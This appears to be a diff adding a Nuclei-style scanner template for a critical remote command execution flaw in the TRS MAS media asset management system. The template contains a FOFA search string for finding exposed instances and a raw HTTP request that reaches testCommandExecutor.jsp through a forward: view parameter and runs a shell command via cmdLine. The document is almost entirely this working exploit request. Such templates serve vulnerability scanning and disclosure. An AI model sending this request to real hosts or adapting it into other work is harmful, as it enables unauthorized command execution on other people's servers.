@@ -1,0 +1,21 @@
+id: poc-lp436bnrv9g463m9
+info:
+  name: 拓尔思 MAS testCommandExecutor.jsp 远程命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/lp436bnrv9g463m9'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: lp436bnrv9g463m9
+    fofa: '"MAS媒资管理系统登录页面"'
+http:
+- raw:
+  - 'GET /mas/front/vod/main.do?method=newList&view=forward:/sysinfo/testCommandExecutor.jsp&cmdLine=dir&workDir=&pathEnv=&libPathEnv= HTTP/1.1
+
+    Host: {{Hostname}}'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
